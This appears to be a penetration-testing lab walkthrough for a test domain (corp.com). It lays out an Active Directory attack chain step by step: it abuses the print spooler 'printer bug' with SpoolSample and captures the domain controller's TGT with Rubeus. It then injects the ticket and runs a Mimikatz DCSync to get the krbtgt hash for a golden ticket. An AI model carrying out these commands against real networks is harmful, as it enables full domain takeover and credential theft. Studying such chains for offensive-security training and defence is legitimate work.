# In order to exploit the printer bug in this scenario, we must determine if the print spooler service is running and is available on the domain controller from FILES01

# we'll log in to FILES01 as the adam user and attempt to access the named pipe with the dir command.

    dir \\dc01\pipe\spoolss
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
                                                  spoolss

    Use Rubeus in monitor mode, which allows us to monitor incoming connections and tickets in real time.
    .\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$

     Trigger the print spooler change notification with SpoolSample.exe by specifying the target machine and the capture server.
     PS C:\Tools> .\SpoolSample.exe DC01 FILES01

     We'll switch back to Rubeus, which displays the TGT for the domain controller account.
     Lest inject the ticket to memory using the ptt command.
     
     PS C:\Tools> .\Rubeus.exe ptt /ticket:doIFXDCCBVigAwIBBaEDAgEWooIEcDCCBGxhgg...

     Perform the DCSync attack using Mimikatz, which is also located on FILES01.
     mimikatz # lsadump::dcsync /domain:corp.com /user:corp\krbtgt

     With the krbtgt NTLM hash, we can craft a golden ticket and obtain access to any resource in the domain.
